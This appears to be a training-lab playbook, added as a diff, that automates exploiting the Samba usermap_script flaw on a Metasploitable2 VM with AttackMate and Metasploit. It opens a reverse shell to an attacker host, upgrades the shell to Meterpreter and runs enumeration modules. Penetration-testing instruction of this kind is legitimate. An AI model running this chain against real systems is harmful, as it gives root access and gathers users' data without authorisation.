@@ -1,0 +1,165 @@
+#
+# Walkthrough 3: Samba usermap_script + Meterpreter Upgrade
+#
+# Description:
+#     Guided walkthrough of exploiting the Samba usermap_script vulnerability on
+#     Metasploitable2, running commands in the raw shell session,
+#     upgrading the session to Meterpreter, and running post-exploitation
+#     commands using Meterpreter's stdapi.
+#
+#     Attack steps:
+#     1. Exploit the Samba usermap_script vulnerability to get a reverse shell
+#     2. Run basic commands in the raw shell session
+#     3. Upgrade the raw shell to a Meterpreter session
+#     4. Run Meterpreter stdapi commands (sysinfo, getuid, ps)
+#     5. Run Metasploit post modules for deeper enumeration
+#
+# Background:
+#     Samba 3.0.20 through 3.0.25rc3 (CVE-2007-2447) passes the username to a
+#     shell when the "username map script" smb.conf option is set. Injecting
+#     shell metacharacters into the username causes the server to execute
+#     arbitrary commands as root on port 139.
+#     See handout 04_shell_upgrades_post_exploitation.md for manual steps.
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml 03_samba_meterpreter.yml
+#
+# IMPORTANT: Replace METASPLOITABLE and ATTACKER with your actual IPs!
+#
+
+vars:
+  METASPLOITABLE: 192.168.56.101
+  ATTACKER: 192.168.56.1
+  PAYLOAD_INITIAL: cmd/unix/reverse_perl
+  LPORT_INITIAL: "4422"
+  LPORT_UPGRADE: "4433"
+
+commands:
+  # ============================================
+  # STEP 1: Exploit the Samba usermap_script vulnerability
+  #
+  # The payload "cmd/unix/reverse_perl" gives a basic reverse shell.
+  # It is a stageless, Perl-based shell, which is more reliable on
+  # targets with limited tooling than a bash reverse shell.
+  # ============================================
+
+  - type: debug
+    cmd: Executing this exploit with msf-module can take 2-3 minutes
+
+  - type: msf-module
+    cmd: exploit/multi/samba/usermap_script
+    payload: $PAYLOAD_INITIAL
+    options:
+      RHOSTS: $METASPLOITABLE
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT_INITIAL
+    creates_session: shell
+
+  # ============================================
+  # STEP 2: Run basic commands in the raw shell
+  #
+  # This is a raw command shell: no TTY, no job control.
+  # Commands that need a terminal (like sudo or vi) will break here.
+  # Note how output is captured in $RESULT_STDOUT after each command.
+  # ============================================
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  - type: debug
+    cmd: "Shell session identity: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: shell
+    cmd: uname -a
+
+  - type: debug
+    cmd: "Target system: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: shell
+    cmd: cat /etc/issue
+
+  # ============================================
+  # STEP 3: Upgrade raw shell to Meterpreter
+  #
+  # The post/multi/manage/shell_to_meterpreter module:
+  # - takes an existing raw shell session (SESSION: $LAST_MSF_SESSION)
+  # - uploads a small Meterpreter stager to the target
+  # - executes it, which connects back to our new handler on LPORT_UPGRADE
+  # - creates a new, full Meterpreter session
+  #
+  # $LAST_MSF_SESSION is automatically set to the numeric session ID after
+  # the exploit ran. The post module's SESSION option needs this numeric ID.
+  # ============================================
+  - type: debug
+    cmd: "Upgrading shell (session $LAST_MSF_SESSION) to Meterpreter..."
+
+  - type: msf-module
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT_UPGRADE
+    creates_session: meterpreter
+
+  # Brief pause for the Meterpreter session to fully initialize
+  - type: sleep
+    seconds: 5
+
+  # ============================================
+  # STEP 4: Meterpreter stdapi commands
+  #
+  # stdapi: True tells AttackMate to use Meterpreter's built-in API
+  # rather than passing the command to a shell.
+  # These commands are more reliable and work even without a PTY.
+  # ============================================
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: sysinfo
+
+  - type: debug
+    cmd: "Sysinfo output: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: getuid
+
+  - type: debug
+    cmd: "Running as: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: ps
+
+  # ============================================
+  # STEP 5: Post modules for deeper enumeration
+  #
+  # Post modules run against the Meterpreter session.
+  # We use $LAST_MSF_SESSION, which now points to the upgraded session.
+  # ============================================
+  - type: msf-module
+    cmd: post/linux/gather/enum_network
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_protections
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: debug
+    cmd: "Walkthrough complete. Check output.log for results."
